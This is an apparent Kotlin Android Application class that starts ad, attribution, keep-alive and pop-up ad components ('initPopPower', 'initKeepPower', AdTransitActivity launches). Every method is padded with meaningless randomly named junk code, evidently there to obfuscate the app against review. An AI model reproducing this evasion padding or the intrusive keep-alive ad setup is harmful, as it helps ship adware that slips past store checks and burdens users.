package cfns.xads.zsubm

import android.app.Application
import android.os.Bundle
import android.content.Intent
import cfns.xads.zsubm.WOCC
import com.huawei.recharge.featurexzy21.df
import com.kwad.sdk.api.proxy.app.Helpers
import com.b.w.BaseJksApplication
import cfns.mrkkk.cdy.base.APPContext
import cfns.mrkkk.cdy.base.OverseaAppHost
import cfns.mrkkk.cdy.base.OverseaAppInitializer
import cfns.mrkkk.cdy.ad.runtime.AdLifecycleInstaller

class RSX : BaseJksApplication(), OverseaAppHost {

    companion object {
        @JvmStatic
        var insApp: RSX? = null
    }

    override fun onCreate() {
        val oBjlikcKIJgkuKCE : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val FXxGgOiKEyiYpKxixz  = oBjlikcKIJgkuKCE ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_13" 
            }
            if (FXxGgOiKEyiYpKxixz .startsWith("dmQjNgyTYRJmtiTLcdE ")) {
                android.util.Log.v("TAG", FXxGgOiKEyiYpKxixz )
            }
        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
        super.onCreate()
        insApp = this
        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
        OverseaAppInitializer.init(this, this)
        // 保证白包有 context
        APPContext.setApplication(this)
        AdLifecycleInstaller.install(this)
    }

    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
    override fun openLaunch(intent: Intent?) {
           val FHQBScEekpd : Any = if (kotlin.random.Random.nextBoolean()) 35 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val qHFllF  = (FHQBScEekpd  as? String)?.reversed() ?: "iFuXqavXO_-260686660"

        if (qHFllF  == "BIEWNPGV") {
            java.lang.System.out.print(qHFllF )
        }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
           val UAVLAWpp : Any = if (kotlin.random.Random.nextBoolean()) 6 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val ujHMihGFeveR  = (UAVLAWpp  as? String)?.reversed() ?: "YtQDjrMRUaXwl_-2092461576"

        if (ujHMihGFeveR  == "TujLtNm") {
            java.lang.System.out.print(ujHMihGFeveR )
        }
        WOCC.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_JNJbtF  = listOf("BrbGZUQrtDTJokqTYV", "kYErd", "psdQc").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_JTpEaVlbbVbadwsjl  = arr_JNJbtF .filter { it.length > 63 }
         if (ad_JTpEaVlbbVbadwsjl .isNotEmpty() && java.lang.System.currentTimeMillis() < 45) {
             ad_JTpEaVlbbVbadwsjl .forEach { _ ->  }
         }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        df.page(insApp, intent)
    }

    override fun initPopPower() {
        val arr_oneiWpLbL  = listOf("BgpzKxEiLvABwPuwGS", "MYJjirorkD", "UsecJczFNCXBNIauXxY").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_SypkozIq  = arr_oneiWpLbL .filter { it.length > 77 }
         if (ad_SypkozIq .isNotEmpty() && java.lang.System.currentTimeMillis() < 61) {
             ad_SypkozIq .forEach { _ ->  }
         }
        df.vir(insApp)
    }

    override fun initKeepPower(app: Application) {
        val arr_eVrxPfsVo = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_aKCuUYqjsiDxMi  = (arr_eVrxPfsVo  shl 16) xor (arr_eVrxPfsVo  shr 76)
         val j_QAfTzIBQh  = i_aKCuUYqjsiDxMi .inv() and 0xFFFF
         if (j_QAfTzIBQh  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_JvWKSsxOffBaX")
         }
        Helpers.setGuiyin(true)
    }


}